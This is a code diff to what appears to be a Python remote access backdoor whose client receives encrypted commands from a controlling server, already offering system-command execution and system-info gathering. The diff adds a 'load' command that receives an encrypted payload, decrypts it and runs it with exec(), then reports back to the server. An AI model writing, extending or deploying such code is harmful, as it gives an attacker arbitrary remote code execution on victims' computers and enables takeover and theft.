@@ -39,6 +39,14 @@ def connect():
             except Exception as e:
                 server.send(enctry(str(e),md5).encode())
                 continue
+        elif 'load' in cmd:
+            library = server.recv(81962).decode('gbk')
+            library = dectry(library,md5)
+            try:
+                exec(library)
+                server.send(enctry("Library loaded &)",md5).encode())
+            except Exception as e:
+                server.send(enctry(str(e),md5).encode())
         elif 'settimeout' in cmd:
             cmds = cmd.split()
             try:
@@ -54,6 +62,7 @@ def connect():
             sysinfo
             run [System Command]
             settimeout [Time]
+            load [Python File Path]
             """
             server.send(enctry(help,md5).encode())
         elif 'exit' in cmd:
